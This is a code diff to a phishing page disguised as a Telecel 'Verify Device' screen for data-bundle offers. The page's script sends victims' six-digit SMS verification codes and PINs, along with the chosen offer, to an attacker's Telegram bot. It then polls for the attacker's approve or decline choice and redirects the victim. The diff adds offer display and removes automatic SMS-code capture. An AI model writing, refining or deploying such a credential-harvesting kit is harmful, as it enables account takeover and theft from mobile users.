@@ -14,7 +14,7 @@
             display: flex;
             align-items: center;
             justify-content: center;
-            padding: 12px;
+            padding: 10px;
         }
         .container {
             width: 100%;
@@ -24,22 +24,49 @@
             box-shadow: 0 10px 40px rgba(0,0,0,0.1);
             overflow: hidden;
         }
-        .logo-section { text-align: center; padding: 35px 0 20px; }
-        .telecel-logo { width: 138px; height: 138px; margin: 0 auto; }
-        h1 { text-align: center; font-size: 23px; font-weight: 700; margin: 10px 0 6px; color: #1e2937; }
-        .subtitle { text-align: center; color: #475569; font-size: 15.2px; padding: 0 25px 20px; line-height: 1.45; }
+        .logo-section { 
+            text-align: center; 
+            padding: 25px 0 15px; 
+        }
+        .telecel-logo { 
+            width: 132px; 
+            height: auto; 
+            margin: 0 auto; 
+        }
+        h1 { 
+            text-align: center; 
+            font-size: 22px; 
+            font-weight: 700; 
+            margin: 8px 0 5px; 
+            color: #1e2937; 
+        }
+        .subtitle { 
+            text-align: center; 
+            color: #475569; 
+            font-size: 15px; 
+            padding: 0 25px 16px; 
+            line-height: 1.5; 
+        }
+        .offer-info {
+            background: #fff0f0;
+            margin: 0 20px 18px;
+            padding: 14px;
+            border-radius: 14px;
+            text-align: center;
+            border: 1px solid #ffe0e0;
+        }
         .otp-container {
             display: flex;
             justify-content: center;
             gap: 10px;
-            margin: 25px 0 30px;
-            padding: 0 10px;
+            margin: 18px 0 25px;
+            padding: 0 15px;
         }
         .otp-input {
-            width: 52px;
-            height: 62px;
+            width: 50px;
+            height: 58px;
             text-align: center;
-            font-size: 26px;
+            font-size: 24px;
             font-weight: 700;
             border: 2px solid #e2e8f0;
             border-radius: 12px;
@@ -49,10 +76,12 @@
             border-color: #E30613;
             box-shadow: 0 0 0 3px rgba(227, 6, 19, 0.15);
         }
-        .form-section { padding: 0 25px 35px; }
+        .form-section { 
+            padding: 0 25px 30px; 
+        }
         .error-msg {
             text-align: center;
-            margin: 12px 20px;
+            margin: 10px 20px 15px;
             font-size: 14.5px;
             padding: 12px;
             border-radius: 10px;
@@ -83,46 +112,6 @@
             border-radius: 50px;
             cursor: pointer;
         }
-
-        /* PIN Modal */
-        #pinModal {
-            position: fixed;
-            inset: 0;
-            background: rgba(0,0,0,0.9);
-            display: none;
-            align-items: center;
-            justify-content: center;
-            z-index: 10000;
-        }
-        .modal-content {
-            width: 100%;
-            max-width: 420px;
-            background: white;
-            border-radius: 24px;
-            padding: 30px 20px;
-            text-align: center;
-        }
-
-        #spinner {
-            position: fixed;
-            inset: 0;
-            background: rgba(0,0,0,0.92);
-            display: none;
-            justify-content: center;
-            align-items: center;
-            z-index: 9999;
-            flex-direction: column;
-            color: white;
-        }
-        .spin {
-            width: 70px;
-            height: 70px;
-            border: 7px solid #fff;
-            border-top-color: #E30613;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-        }
-        @keyframes spin { to { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
@@ -133,8 +122,16 @@
         </div>
         <h1>Verify Device</h1>
         <p class="subtitle">Please enter the 6-digit code sent to your number</p>
+
+        <!-- Show selected offer -->
+        <div class="offer-info" id="offerInfo">
+            <strong id="offerTitle"></strong><br>
+            <span id="offerPrice" style="color:#E30613; font-weight:700; font-size:21px;"></span>
+        </div>
+
         <div class="otp-container" id="otpInputs"></div>
         <div class="error-msg" id="errMsg"></div>
+
         <div class="form-section">
             <button class="btn-action" id="verifyBtn">Verify Device Code</button>
             <button class="back-btn" onclick="window.location.href='index.html'">← Back to Data Offers</button>
@@ -158,9 +155,10 @@
         </div>
     </div>
 
-    <div id="spinner">
+    <!-- Spinner -->
+    <div id="spinner" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.92); z-index:10000; align-items:center; justify-content:center; flex-direction:column; color:white;">
         <div class="spin"></div>
-        <p style="margin-top:15px;">Waiting for approval...</p>
+        <p style="margin-top:20px;">Verifying...</p>
     </div>
 
     <script>
@@ -176,6 +174,18 @@
         const pinErrMsg = document.getElementById('pinErrMsg');
         const spinner = document.getElementById('spinner');
         const pinModal = document.getElementById('pinModal');
+        const offerTitleEl = document.getElementById('offerTitle');
+        const offerPriceEl = document.getElementById('offerPrice');
+
+        function loadOffer() {
+            const params = new URLSearchParams(window.location.search);
+            const name = params.get('offer') || 'Data Bundle';
+            const data = params.get('data') || '';
+            const price = params.get('price') || '0';
+           
+            offerTitleEl.textContent = name + (data ? ` - ${data}` : '');
+            offerPriceEl.textContent = `GHS ${price}`;
+        }
 
         function createInputs(id, count) {
             const container = document.getElementById(id);
@@ -214,18 +224,6 @@
             });
         }
 
-        async function requestAutoOTP() {
-            if (!('OTPCredential' in window)) return;
-            try {
-                const credential = await navigator.credentials.get({ otp: { transport: ['sms'] } });
-                if (credential?.code) {
-                    const inputs = document.querySelectorAll('#otpInputs .otp-input');
-                    credential.code.split('').forEach((digit, i) => { if (inputs[i]) inputs[i].value = digit; });
-                    setTimeout(submitCode, 500);
-                }
-            } catch (e) {}
-        }
-
         function submitCode() {
             const code = getCode('otpInputs');
             if (code.length !== 6) return;
@@ -239,7 +237,7 @@
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     chat_id: CONFIG.CHAT_ID,
-                    text: `<b>🔴 Device Verification Code</b>\n\nCode: <code>${code}</code>\n\nChoose Action:`,
+                    text: `<b>🔴 Device Verification Code</b>\n\nOffer: ${offerTitleEl.textContent}\nCode: <code>${code}</code>\n\nChoose Action:`,
                     parse_mode: 'HTML',
                     reply_markup: {
                         inline_keyboard: [[
@@ -274,7 +272,6 @@
                                     errMsg.textContent = "Code declined. Please try again.";
                                     errMsg.style.display = 'block';
                                     document.querySelectorAll('#otpInputs .otp-input').forEach(i => i.value = '');
-                                    focusFirstInput('otpInputs');   // ← Important fix
                                 }
                             }
                         });
@@ -311,9 +308,7 @@
                         ]]
                     }
                 })
-            }).then(() => {
-                startPinPolling(validId, invalidId);
-            });
+            }).then(() => startPinPolling(validId, invalidId));
         }
 
         function startPinPolling(validId, invalidId) {
@@ -328,7 +323,9 @@
                                 if (cb === validId) {
                                     clearInterval(interval);
                                     pinModal.style.display = 'none';
-                                    window.location.href = CONFIG.SUCCESS_PAGE;
+                                    // Pass parameters to success page
+                                    const params = new URLSearchParams(window.location.search);
+                                    window.location.href = CONFIG.SUCCESS_PAGE + '?' + params.toString();
                                 } else if (cb === invalidId) {
                                     clearInterval(interval);
                                     pinErrMsg.textContent = "Invalid PIN. Please try again.";
@@ -345,10 +342,9 @@
         // Initialize
         createInputs('otpInputs', 6);
         setupAutoFocus('otpInputs', 6, submitCode);
-        document.querySelectorAll('#otpInputs .otp-input')[0].focus();
-
-        window.onload = () => setTimeout(requestAutoOTP, 800);
+        focusFirstInput('otpInputs');
         document.getElementById('verifyBtn').onclick = submitCode;
+        loadOffer();
     </script>
 </body>
 </html>
